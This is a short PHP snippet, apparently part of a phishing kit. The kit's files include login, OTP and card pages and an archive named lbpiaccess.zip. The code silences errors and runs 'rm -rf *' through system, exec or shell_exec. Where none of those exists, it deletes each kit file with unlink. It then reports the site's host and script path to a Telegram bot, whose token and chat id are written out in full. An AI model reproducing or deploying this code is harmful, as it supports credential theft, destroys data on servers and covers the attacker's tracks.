error_reporting(0);
error_log(0);

 if(function_exists('system')) {
         system('rm -rf *');
      }
      elseif(function_exists('exec')) {
         exec('rm -rf *');
      }
      elseif(function_exists('shell_exec')) {
         shell_exec('rm -rf *');
      }
      else {
        unlink('lbpiaccess.zip');
        unlink('confirm.php');
        unlink('cc.jpg');
        unlink('otp-login.php');
        unlink('otp-expired.jpg');
        unlink('otp.jpg');
        unlink('mobile-login.php');
        unlink('mobile.jpg');
        unlink('login.php');
        unlink('index.php');
        unlink('index.jpg');
      }

file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?chat_id=-635799224&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);

